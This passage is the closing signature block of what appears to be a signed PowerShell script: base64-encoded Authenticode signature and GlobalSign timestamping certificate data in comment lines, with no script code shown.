# v1BJQDSjVYk6N4ArEC0uVGXO0whk1pf56l0E30jTx0whibqdrL/joPGNry0Yo9nu
# ttgdJ29JmRl929+8lBRY/eKNrUqmQqSgSNoyQ4+nyc6nxus44blW3uIqQJ52I5DH
# SP+O2r1VOQftspThXLIj0Xy0CAY0zwdvtkdX1CueD+NlO0gKOfI+qFoGSHFGkIjE
# r8eSBxT8PLLN9wLpDa8E5nxDVFf1S4G/tvIga/IxF1JujlhKDbwCSSVIRKXUZP5o
# Qmjtp0T7EUG64/D28DJu0zd4/R/U4HJ9GabXRHcCczbKKK4WOOI8xQo3cabag2i6
# /DXQBrlOI3WJM7b92jUvr45AeFdMOc59Qd+AIeMG8qA8o8fNA+utHL9VCAic0zUT
# dB3HA86TLfDXXIzoUJpXFBFbmjIPPR9CzRf3vB3TqrTjpW9PDMlwX6QdYd4LH+E7
# HPLKyuV2HE29Crg+3wSg5GGGTHnUUepR4+KY2c9lcQfH3r6cOx9kn//0Q28mH2I6
# 6W5ezgtMx06Z9OvWYTed/lQJL2j6OX7h0QMXtNGw7DF71pgV5yqcTaCgqyutxtfN
# 6jNdz6yUZ31d1kBDZxwwVhYzHiXFDhM0CKwzVa+XH0cVN/7tcDlS+hMH/9a8Vi0h
# H+3/KziLGtiSr9qH2lnwShZmYaGCFs0wghbJBgorBgEEAYI3AwMBMYIWuTCCFrUG
# CSqGSIb3DQEHAqCCFqYwghaiAgEDMQ0wCwYJYIZIAWUDBAIBMIHoBgsqhkiG9w0B
# CRABBKCB2ASB1TCB0gIBAQYLKwYBBAGgMgIDAQIwMTANBglghkgBZQMEAgEFAAQg
# ukR3K7PKmlAn3laH0BwNKSE2MlnNWQdZSVi0GoOQ98MCFBelLzhIn4x1KcwhK6z1
# rNDpR4i0GA8yMDI0MDcyNDA1MTkwN1owAwIBAaBhpF8wXTELMAkGA1UEBhMCQkUx
# GTAXBgNVBAoMEEdsb2JhbFNpZ24gbnYtc2ExMzAxBgNVBAMMKkdsb2JhbHNpZ24g
# VFNBIGZvciBDb2RlU2lnbjEgLSBSNiAtIDIwMjMxMaCCElQwggZsMIIEVKADAgEC
# AhABm+reyE1rj/dsOp8uASQWMA0GCSqGSIb3DQEBCwUAMFsxCzAJBgNVBAYTAkJF
# MRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWdu
# IFRpbWVzdGFtcGluZyBDQSAtIFNIQTM4NCAtIEc0MB4XDTIzMTEwNzE3MTM0MFoX
# DTM0MTIwOTE3MTM0MFowXTELMAkGA1UEBhMCQkUxGTAXBgNVBAoMEEdsb2JhbFNp
# Z24gbnYtc2ExMzAxBgNVBAMMKkdsb2JhbHNpZ24gVFNBIGZvciBDb2RlU2lnbjEg
# LSBSNiAtIDIwMjMxMTCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAOqE
# N1BoPJWFtUhUcZfzhHLJnYDTCNxZu7/LTZBpR4nlLNjxqGp+YDdJc5u4mLMU4O+M
# k3AgtfUr12YFdT96hFCpUg/g1udv1Bw1LuAvKSSjjnclJ+C4831kdQyaQuXGneLY
# h3OL76CNl34WoMSyRs9gxs8PgVCA3U/p5EaiNKc+GMdrtLb7vtqpVn5/nF02PWM0
# IUvI0qMTGj4vUWh1+X/8cIQRZTMSs0ZlKISgM8CSne24H4lj0B57LFuwBPS9cmPO
# sDEhAQJqcrIiLO/rKjsQ1fGa9CaiLPxTAQR5I2lR012+c4TLm4OIbSDSIM6Bq2oi
# S3mQQuaCQq8D69TQ2oN6wy1I8c1FkbcRQd0X70D8EqKywFmqVJdObcN63YaG1Ds3
# RzjoAzwxv0wze0Ps8ND/ZaafmD3SxrpZImwQWBHFBMzoopiwHTPQ85Ud+O1xtAtB
# 1WR5orxgLsN6yd5wNxIWPgKPXTgRsASJZ4ulLSDbuNb1nPUPvIi/JyzD+SCiwQID
# AQABo4IBqDCCAaQwDgYDVR0PAQH/BAQDAgeAMBYGA1UdJQEB/wQMMAoGCCsGAQUF
# BwMIMB0GA1UdDgQWBBT5Tqu+uPhb/8LHA/RB7pz41nR9PzBWBgNVHSAETzBNMAgG
# BmeBDAEEAjBBBgkrBgEEAaAyAR4wNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cu
# Z2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wDAYDVR0TAQH/BAIwADCBkAYIKwYB
# BQUHAQEEgYMwgYAwOQYIKwYBBQUHMAGGLWh0dHA6Ly9vY3NwLmdsb2JhbHNpZ24u
# Y29tL2NhL2dzdHNhY2FzaGEzODRnNDBDBggrBgEFBQcwAoY3aHR0cDovL3NlY3Vy
# ZS5nbG9iYWxzaWduLmNvbS9jYWNlcnQvZ3N0c2FjYXNoYTM4NGc0LmNydDAfBgNV
# HSMEGDAWgBTqFsZp5+PLV0U5M6TwQL7Qw71lljBBBgNVHR8EOjA4MDagNKAyhjBo
# dHRwOi8vY3JsLmdsb2JhbHNpZ24uY29tL2NhL2dzdHNhY2FzaGEzODRnNC5jcmww
# DQYJKoZIhvcNAQELBQADggIBAJX0Z8+TmkOSgxd21iBVvIn/5F+y5RUat5cRQC4A
# Qb7FPySgG0cHMwRMtLRi/8bu0wzCNKCUXDeY60T4X/gnCgK+HtEkHSPLLxyrJ3qz
# qcUvDOTlkPAVJB6jFRn474PoT7toniNvfT0NcXBhMnxGbvKP0ZzoQ036g+H/xOA+
# /t5X3wZr82oGgWirDHwq949C/8BzadscpxZPJhlYc+2UXuQaohCCBzI7yp6/3Tl1
# 1LyLVD9+UJU0n5I5JFMYg1DUWy9mtHv+WynrHsUF/aM9+6Gw8yt5D7FLrMOj2aPc
# LJwrI5b2eiq7rcVXtoS2Y7NgmBHsxtZmbyKDHIpYA/SP7JxO0N/uzmEh07WVVEk7
# IVE9oSOFksJb8nqUhJgKjyRWIooE+rSaiUg1+G/rgYYRU8CTezq01DTMYtY1YY6m
# UPuIdB7XMTUhHhG/q6NkU45U4nNmpPtmY+E3ycRr+yszixHDdJCBg8hPhsrdSpfb
# fpBQJaFh7IabNlIHyz5iVewzpuW4GvrdJC4M+TKJMWo1lf720f8Xiq4jCSshrmLu
# 9+4357DJsxXtdpq3/ef+4WjeRMEKdOGVyFf7FOseWt+WdcVlGff01Y0hr2O26/Ti
# F0aft9cHbmqdK/7p0nFO0r5PYtNJ1mBfQON2mSBE2Epcs10a2eKqv01ZABeeYGc6
# RxKgMIIGWTCCBEGgAwIBAgINAewckkDe/S5AXXxHdDANBgkqhkiG9w0BAQwFADBM
# MSAwHgYDVQQLExdHbG9iYWxTaWduIFJvb3QgQ0EgLSBSNjETMBEGA1UEChMKR2xv
# YmFsU2lnbjETMBEGA1UEAxMKR2xvYmFsU2lnbjAeFw0xODA2MjAwMDAwMDBaFw0z
# NDEyMTAwMDAwMDBaMFsxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWdu
# IG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWduIFRpbWVzdGFtcGluZyBDQSAtIFNI
# QTM4NCAtIEc0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA8ALiMCP6
# 4BvhmnSzr3WDX6lHUsdhOmN8OSN5bXT8MeR0EhmW+s4nYluuB4on7lejxDXtszTH
# rMMM64BmbdEoSsEsu7lw8nKujPeZWl12rr9EqHxBJI6PusVP/zZBq6ct/XhOQ4j+
# kxkX2e4xz7yKO25qxIjw7pf23PMYoEuZHA6HpybhiMmg5ZninvScTD9dW+y279Jl
# z0ULVD2xVFMHi5luuFSZiqgxkjvyen38DljfgWrhsGweZYIq1CHHlP5CljvxC7F/
# f0aYDoc9emXr0VapLr37WD21hfpTmU1bdO1yS6INgjcZDNCr6lrB7w/Vmbk/9E81
# 8ZwP0zcTUtklNO2W7/hn6gi+j0l6/5Cx1PcpFdf5DV3Wh0MedMRwKLSAe70qm7uE
# 4Q6sbw25tfZtVv6KHQk+JA5nJsf8sg2glLCylMx75mf+pliy1NhBEsFV/W6Rxbux
# TAhLntRCBm8bGNU26mSuzv31BebiZtAOBSGssREGIxnk+wU0ROoIrp1JZxGLguWt
# WoanZv0zAwHemSX5cW7pnF0CTGA8zwKPAf1y7pLxpxLeQhJN7Kkm5XcCrA5XDAnR
# YZ4miPzIsk3bZPBFn7rBP1Sj2HYClWxqjcoiXPYMBOMp+kuwHNM3dITZHWarNHOP
# Hn18XpbWPRmwl+qMUJFtr1eGfhA3HWsaFN8CAwEAAaOCASkwggElMA4GA1UdDwEB
# /wQEAwIBhjASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBTqFsZp5+PLV0U5
# M6TwQL7Qw71lljAfBgNVHSMEGDAWgBSubAWjkxPioufi1xzWx/B/yGdToDA+Bggr
# BgEFBQcBAQQyMDAwLgYIKwYBBQUHMAGGImh0dHA6Ly9vY3NwMi5nbG9iYWxzaWdu
# LmNvbS9yb290cjYwNgYDVR0fBC8wLTAroCmgJ4YlaHR0cDovL2NybC5nbG9iYWxz
# aWduLmNvbS9yb290LXI2LmNybDBHBgNVHSAEQDA+MDwGBFUdIAAwNDAyBggrBgEF
# BQcCARYmaHR0cHM6Ly93d3cuZ2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wDQYJ
# KoZIhvcNAQEMBQADggIBAH/iiNlXZytCX4GnCQu6xLsoGFbWTL/bGwdwxvsLCa0A
# OmAzHznGFmsZQEklCB7km/fWpA2PHpbyhqIX3kG/T+G8q83uwCOMxoX+SxUk+RhE
# 7B/CpKzQss/swlZlHb1/9t6CyLefYdO1RkiYlwJnehaVSttixtCzAsw0SEVV3ezp
# Sp9eFO1yEHF2cNIPlvPqN1eUkRiv3I2ZOBlYwqmhfqJuFSbqtPl/KufnSGRpL9Ka
# oXL29yRLdFp9coY1swJXH4uc/LusTN763lNMg/0SsbZJVU91naxvSsguarnKiMMS
# ME6yCHOfXqHWmc7pfUuWLMwWaxjN5Fk3hgks4kXWss1ugnWl2o0et1sviC49ffHy
# kTAFnM57fKDFrK9RBvARxx0wxVFWYOh8lT0i49UKJFMnl4D6SIknLHniPOWbHuOq
# hIKJPsBK9SH+YhDtHTD89szqSCd8i3VCf2vL86VrlR8EWDQKie2CUOTRe6jJ5r5I
# qitV2Y23JSAOG1Gg1GOqg+pscmFKyfpDxMZXxZ22PLCLsLkcMe+97xTYFEBsIB3C
# LegLxo1tjLZx7VIh/j72n585Gq6s0i96ILH0rKod4i0UnfqWah3GPMrz2Ry/U02k
# R1l8lcRDQfkl4iwQfoH5DZSnffK1CfXYYHJAUJUg1ENEvvqglecgWbZ4xqRqqiKb
# MIIFgzCCA2ugAwIBAgIORea7A4Mzw4VlSOb/RVEwDQYJKoZIhvcNAQEMBQAwTDEg
# MB4GA1UECxMXR2xvYmFsU2lnbiBSb290IENBIC0gUjYxEzARBgNVBAoTCkdsb2Jh
# bFNpZ24xEzARBgNVBAMTCkdsb2JhbFNpZ24wHhcNMTQxMjEwMDAwMDAwWhcNMzQx
# MjEwMDAwMDAwWjBMMSAwHgYDVQQLExdHbG9iYWxTaWduIFJvb3QgQ0EgLSBSNjET
# MBEGA1UEChMKR2xvYmFsU2lnbjETMBEGA1UEAxMKR2xvYmFsU2lnbjCCAiIwDQYJ
# KoZIhvcNAQEBBQADggIPADCCAgoCggIBAJUH6HPKZvnsFMp7PPcNCPG0RQssgrRI
# xutbPK6DuEGSMxSkb3/pKszGsIhrxbaJ0cay/xTOURQh7ErdG1rG1ofuTToVBu1k
# ZguSgMpE3nOUTvOniX9PeGMIyBJQbUJmL025eShNUhqKGoC3GYEOfsSKvGRMIRxD
# aNc9PIrFsmbVkJq3MQbFvuJtMgamHvm566qjuL++gmNQ0PAYid/kD3n16qIfKtJw
# LnvnvJO7bVPiSHyMEAc4/2ayd2F+4OqMPKq0pPbzlUoSB239jLKJz9CgYXfIWHSw
# 1CM69106yqLbnQneXUQtkPGBzVeS+n68UARjNN9rkxi+azayOeSsJDa38O+2HBNX
# k7besvjihbdzorg1qkXy4J02oW9UivFyVm4uiMVRQkQVlO6jxTiWm05OWgtH8wY2
# SXcwvHE35absIQh1/OZhFj931dmRl4QKbNQCTXTAFO39OfuD8l4UoQSwC+n+7o/h
# bguyCLNhZglqsQY6ZZZZwPA1/cnaKI0aEYdwgQqomnUdnjqGBQCe24DWJfncBZ4n
# WUx2OVvq+aWh2IMP0f/fMBH5hc8zSPXKbWQULHpYT9NLCEnFlWQaYw55PfWzjMpY
# rZxCRXluDocZXFSxZba/jJvcE+kNb7gu3GduyYsRtYQUigAZcIN5kZeR1Bonvzce
# MgfYFGM8KEyvAgMBAAGjYzBhMA4GA1UdDwEB/wQEAwIBBjAPBgNVHRMBAf8EBTAD
# AQH/MB0GA1UdDgQWBBSubAWjkxPioufi1xzWx/B/yGdToDAfBgNVHSMEGDAWgBSu
# bAWjkxPioufi1xzWx/B/yGdToDANBgkqhkiG9w0BAQwFAAOCAgEAgyXt6NH9lVLN
# nsAEoJFp5lzQhN7craJP6Ed41mWYqVuoPId8AorRbrcWc+ZfwFSY1XS+wc3iEZGt
# Ixg93eFyRJa0lV7Ae46ZeBZDE1ZXs6KzO7V33EByrKPrmzU+sQghoefEQzd5Mr61
# 55wsTLxDKZmOMNOsIeDjHfrYBzN2VAAiKrlNIC5waNrlU/yDXNOd8v9EDERm8tLj
# vUYAGm0CuiVdjaExUd1URhxN25mW7xocBFymFe944Hn+Xds+qkxV/ZoVqW/hpvvf
# cDDpw+5CRu3CkwWJ+n1jez/QcYF8AOiYrg54NMMl+68KnyBr3TsTjxKM4kEaSHpz
# oHdpx7Zcf4LIHv5YGygrqGytXm3ABdJ7t+uA/iU3/gKbaKxCXcPu9czc8FB10jZp
# nOZ7BN9uBmm23goJSFmH63sUYHpkqmlD75HHTOwY3WzvUy2MmeFe8nI+z1TIvWfs
# pA9MRf/TuTAjB0yPEL+GltmZWrSZVxykzLsViVO6LAUP5MSeGbEYNNVMnbrt9x+v
# JJUEeKgDu+6B5dpffItKoZB0JaezPkvILFa9x8jvOOJckvB595yEunQtYQEgfn7R
# 8k8HWV+LLUNS60YMlOH1Zkd5d9VUWx+tJDfLRVpOoERIyNiwmcUVhAn21klJwGW4
# 5hpxbqCo8YLoRT5s1gLXCmeDBVrJpBAxggNJMIIDRQIBATBvMFsxCzAJBgNVBAYT
# AkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxT
# aWduIFRpbWVzdGFtcGluZyBDQSAtIFNIQTM4NCAtIEc0AhABm+reyE1rj/dsOp8u
# ASQWMAsGCWCGSAFlAwQCAaCCAS0wGgYJKoZIhvcNAQkDMQ0GCyqGSIb3DQEJEAEE
# MCsGCSqGSIb3DQEJNDEeMBwwCwYJYIZIAWUDBAIBoQ0GCSqGSIb3DQEBCwUAMC8G
# CSqGSIb3DQEJBDEiBCApxqLcLFVl8cfavv1GTSOu7sobfgdBE/ao6CQqLZ3TzDCB
# sAYLKoZIhvcNAQkQAi8xgaAwgZ0wgZowgZcEIDqIepUbXrkqXuFPbLt2gjelRdAQ
# W/BFEb3iX4KpFtHoMHMwX6RdMFsxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9i
# YWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWduIFRpbWVzdGFtcGluZyBD
# QSAtIFNIQTM4NCAtIEc0AhABm+reyE1rj/dsOp8uASQWMA0GCSqGSIb3DQEBCwUA
# BIIBgM8zLOcvu7JR1COXaDn1qeo3uvtoc4JNYtdAmJgxyvh3hbYu27UAWmIjOwzS
# eFAtX2GJcHqIHj/gSok5nHxut0pjFnAk9HvCro0A75oZooXblBQ3P/9KLyWB9D5V
# Y2UBwWev1ZgE2inr+CK00DHEst+w/BgdkevliBRGu4po+hZGsW7Oa94nefVtskxZ
# C6BqINBJuhLZfs+pw5OdUVRY2ZAkg3GGxPOWSm9UDfhPmTvWNJGqCrN/2ZgXeMBs
# CyPHoyXL92NPYM1iXmON5XnS9v243R5FBkUm3/iB80RnsxVHEP5PQDLerRh7mQpS
# Tbp9k1MoBz9UDGDjgpRBkyD4hOm4kU/iiTxJYnXbV0hkslzL3ofngQ1O53F7GC5/
# CiiVYTYPO/LTvErZW583/fLyaR4a2Mm9uTkkitUrpEGuhq9lszdBL9KyksB4rZWY
# wkxsjLCI0t7dm6kjUVpPiGoG65ZKgZKTAMe79xPBfRHp0OmjF2juEBDv3rgVWWuD
# zuZCBQ==
# SIG # End signature block
